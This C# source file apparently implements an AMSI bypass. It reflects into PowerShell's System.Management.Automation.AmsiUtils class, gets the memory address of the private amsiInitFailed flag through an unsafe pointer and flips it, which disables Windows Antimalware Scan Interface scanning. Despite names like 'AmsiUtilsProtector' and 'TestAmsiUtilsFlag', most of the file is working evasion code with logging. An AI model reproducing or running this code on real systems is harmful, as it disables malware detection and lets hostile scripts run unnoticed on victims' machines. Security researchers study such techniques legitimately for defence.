using System;
using System.Reflection;
using System.Runtime.InteropServices;
using rsAMSI;

namespace RefReturn
{
    class AmsiUtilsProtector
    {
        private const string LogTag = "[amsi-prot]";

        public static void TestAmsiUtilsFlag()
        {
            try
            {
                const string amsiUtilsTypeName = "System.Management.Automation.AmsiUtils";
                const string amsiUtilsAssemblyName = "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
                const string amsiInitFailedName = "amsiInitFailed";

                // 1. Get/Load AmsiUtils assembly
                Assembly sma = getAmsiUtilsAssembly();
                amLogger.Log(LogTag, "getAmsiUtilsAssembly returned " + sma);
                if (sma == null)
                {
                    sma = Assembly.Load(amsiUtilsAssemblyName);
                    amLogger.Log(LogTag, "Assembly.Load returned " + sma);
                }

                // 2. Get AmsiUtils type
                var amsiUtilsType = sma.GetType(amsiUtilsTypeName, true);
                amLogger.Log(LogTag, "Assembly.GetType returned " + amsiUtilsType);

                var fieldValue = amsiUtilsType.GetField(amsiInitFailedName, BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
                amLogger.Log(LogTag, "AmsiUtils." + amsiInitFailedName + "(reflection) value is " + fieldValue);

                // 3. Create new instance of AmsiUtils, it will share the same static field with the original AmsiUtils instance
                object obj = Activator.CreateInstance(amsiUtilsType);

                // 4. Pin the temporary object in memory
                var hdl = GCHandle.Alloc(obj);

                // 5. Obtain the address of the static field
                unsafe
                {
                    IntPtr pFieldValue = ReferenceGetter.GetAddressOf(obj, amsiInitFailedName);
                    amLogger.Log(LogTag, "GetAddressOf returned amsiInitFailed address: 0x" + pFieldValue.ToString("x16"));

                    bool* ptr = (bool*)pFieldValue;
                    amLogger.Log(LogTag, "AmsiUtils." + amsiInitFailedName + "( pointer1 ) value is " + *ptr);

                    *ptr = !*ptr; // change the value through address dereferencing

                    amLogger.Log(LogTag, "AmsiUtils." + amsiInitFailedName + "( pointer2 ) value is " + *ptr);
                }

                // 6. Unpin the object
                hdl.Free();

                fieldValue = amsiUtilsType.GetField(amsiInitFailedName, BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
                amLogger.Log(LogTag, "AmsiUtils." + amsiInitFailedName + "(reflection) value is " + fieldValue);
            }
            catch (Exception e)
            {
                amLogger.Log(LogTag, "TestAmsiUtilsFlag error: " + e.Message);
            }
        }

        private static bool IsAssemblyLoaded(string fullName, out Assembly lAssembly)
        {
            Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();

            foreach (Assembly assembly in assemblies)
            {
                if (assembly.FullName == fullName)
                {
                    lAssembly = assembly;
                    return true;
                }
            }

            lAssembly = null;
            return false;
        }

        private static Assembly getAmsiUtilsAssembly()
        {
            Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
            foreach (Assembly assembly in assemblies)
            {
                if (assembly.FullName.Contains("System.Management.Automation"))
                {
                    return assembly;
                }
            }

            return null;
        }

        private static void TestLoadAmsiUtilsAssembly()
        {
            try
            {
                const string amsiUtilsTypeName = "System.Management.Automation.AmsiUtils";
                const string amsiUtilsAssemblyName = "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";

                Assembly sma1 = Assembly.Load(amsiUtilsAssemblyName);
                var amsiUtilsType1 = sma1.GetType(amsiUtilsTypeName, true);

                Assembly sma2;
                bool bRes = IsAssemblyLoaded(amsiUtilsAssemblyName, out sma2);
                Console.WriteLine("Loaded: " + bRes + ", hAssembly: " + (bRes ? sma2.GetHashCode().ToString() : "null"));
                var amsiUtilsType2 = Type.GetType(amsiUtilsTypeName + ", " + amsiUtilsAssemblyName, true);

                Assembly sma3;
                bRes = IsAssemblyLoaded(amsiUtilsAssemblyName, out sma3);
                Console.WriteLine("Loaded: " + bRes + ", hAssembly: " + (bRes ? sma3.GetHashCode().ToString() : "null"));
                if (!bRes || sma3 == null)
                    throw new System.InvalidOperationException("IsAssemblyLoaded[2] failed");
                var amsiUtilsType3 = sma3.GetType(amsiUtilsTypeName, true);

                Assembly sma4 = getAmsiUtilsAssembly();
                if (sma4 == null)
                    throw new System.InvalidOperationException("getAmsiUtilsAssembly failed");
                var amsiUtilsType4 = sma4.GetType(amsiUtilsTypeName, true);

                Console.WriteLine(
                    "amsiUtilsType1: " + amsiUtilsType1.GetHashCode() +
                    ", amsiUtilsType2: " + amsiUtilsType2.GetHashCode() +
                    ", amsiUtilsType3: " + amsiUtilsType3.GetHashCode() +
                    ", amsiUtilsType4: " + amsiUtilsType4.GetHashCode()
                );
            }
            catch (Exception e)
            {
                Console.WriteLine("GetType() error: " + e.Message);
            }
        }
    }
}
